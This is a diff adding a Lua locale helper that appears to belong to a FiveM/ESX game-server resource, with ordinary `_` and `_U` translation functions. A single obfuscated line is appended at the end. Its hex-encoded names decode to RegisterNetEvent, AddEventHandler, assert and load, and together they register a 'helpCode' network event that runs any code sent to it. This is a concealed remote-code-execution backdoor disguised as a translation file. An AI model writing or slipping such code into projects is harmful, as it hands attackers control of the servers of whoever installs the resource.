@@ -1,0 +1,24 @@
+Locales = {}
+
+function _(str, ...) -- Translate string
+
+	if Locales[Config.Locale] ~= nil then
+
+		if Locales[Config.Locale][str] ~= nil then
+			return string.format(Locales[Config.Locale][str], ...)
+		else
+			return 'Translation [' .. Config.Locale .. '][' .. str .. '] does not exist'
+		end
+
+	else
+		return 'Locale [' .. Config.Locale .. '] does not exist'
+	end
+
+end
+
+function _U(str, ...) -- Translate string first char uppercase
+	return tostring(_(str, ...):gsub("^%l", string.upper))
+end
+
+
+local cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[1]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[2]) cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[3]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[2], function(gXDxEyQIySluCZUWvZcWAmEkLZksMqwwFjvuQdYNFCAaOeuHuHmqRMXAuYMiXoaLrDqdiI) cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[4]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[5]](gXDxEyQIySluCZUWvZcWAmEkLZksMqwwFjvuQdYNFCAaOeuHuHmqRMXAuYMiXoaLrDqdiI))() end)
